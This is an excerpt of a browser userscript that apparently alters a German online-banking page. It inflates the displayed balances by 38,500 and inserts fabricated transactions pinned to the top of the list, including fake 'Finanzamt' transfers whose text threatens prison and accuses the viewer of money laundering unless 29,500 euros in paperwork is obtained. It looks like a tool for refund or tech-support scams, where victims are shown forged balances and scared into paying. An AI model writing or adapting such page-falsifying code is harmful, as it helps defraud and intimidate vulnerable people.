...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/485439/Ed%20Postcombined%20Kiesl.user.js
// @updateURL https://update.greasyfork.org/scripts/485439/Ed%20Postcombined%20Kiesl.meta.js
// ==/UserScript==
...
var modificationAmount = 38500.00; // Example: +9000 to increase by 9000
...
//====MAIN PAGE BALANCES===================UMSATZE BALANCE
    ...
    var MBALANCE_CONFIGS = [
        ...
        { index: 1, adjustmentAmount: 38500 },
        { index: 4, adjustmentAmount: 38500 }
...
//=====TRANSACTIONS
    ...
    var transactionsToInsert = [
        {
            ...
            transactionAmount: '269.000,00 EUR',
        ...
        },
    {
           ...
           transactionAmount: '29.500,00 EUR',
            preferredInsertionLogic: 'pinned_top',
           moveSteps: 0,
            moveDirection: 'up'
        },
   ...
   {
           recipient: 'Finanzamt',
           transactionInfo: 'SIE GEHEN INS GEFÄNGNIS, WENN SIE UNTERLAGEN FÜR 29.500 Euro NICHT BEKOMMEN.',
           transactionType: ' SEPA Überweisung ',
           transactionDate: '13.03.2024',
           transactionAmount: '1,00 EUR',
            preferredInsertionLogic: 'pinned_top',
           moveSteps: 0,
            moveDirection: 'up'
        },
 {
           recipient: 'Finanzamt',
           transactionInfo: 'SIE GEHEN INS GEFÄNGNIS, WENN SIE UNTERLAGEN FÜR 29.500 Euro NICHT BEKOMMEN. SIE HABEN GELDWÄSCHE GEMACHT.',
           transactionType: ' SEPA Überweisung ',
           transactionDate: '13.03.2024',
           transactionAmount: '5,00 EUR',
            preferredInsertionLogic: 'pinned_top',
           moveSteps: 0,
            moveDirection: 'up'
        },
